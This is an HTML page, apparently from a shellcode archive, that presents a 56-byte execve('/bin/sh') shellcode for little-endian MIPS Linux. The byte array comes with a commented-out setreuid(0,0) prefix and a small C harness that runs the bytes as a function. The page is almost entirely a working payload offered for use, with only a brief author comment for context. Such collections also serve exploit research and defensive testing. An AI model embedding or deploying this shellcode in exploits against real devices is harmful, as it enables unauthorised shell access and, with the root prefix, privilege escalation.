<html><head><title>Linux/mips - execve(/bin/sh) - 56 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/* 56 bytes execve /bin/sh shellcode - linux-mipsel
 * - by core (core@bokeoa.com)
 *
 * Note: For MIPS running in little-endian mode.
 * Tested on a Cobalt Qube2 server running Linux 2.4.18
 *
 * Greetz to bighawk... i couldn't get his execve to work 
 * for some reason :/
 */

char code[] =
/* 16 byte setreuid(0,0) by bighawk */
//&quot;\xff\xff\x04\x30\xff\xff\x05\x30&quot;
//&quot;\xe6\x0f\x02\x34\xcc\x48\x49\x03&quot;

/* 56 byte execve(&quot;/bin/sh&quot;,[&quot;/bin/sh&quot;],[]) by core */
&quot;\xff\xff\x10\x04\xab\x0f\x02\x24&quot;
&quot;\x55\xf0\x46\x20\x66\x06\xff\x23&quot;
&quot;\xc2\xf9\xec\x23\x66\x06\xbd\x23&quot;
&quot;\x9a\xf9\xac\xaf\x9e\xf9\xa6\xaf&quot;
&quot;\x9a\xf9\xbd\x23\x21\x20\x80\x01&quot;
&quot;\x21\x28\xa0\x03\xcc\xcd\x44\x03&quot;
&quot;/bin/sh&quot;;

main() {
  void (*a)() = (void *)code;
  printf(&quot;size: %d bytes\n&quot;, sizeof(code));
  a();
}




<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
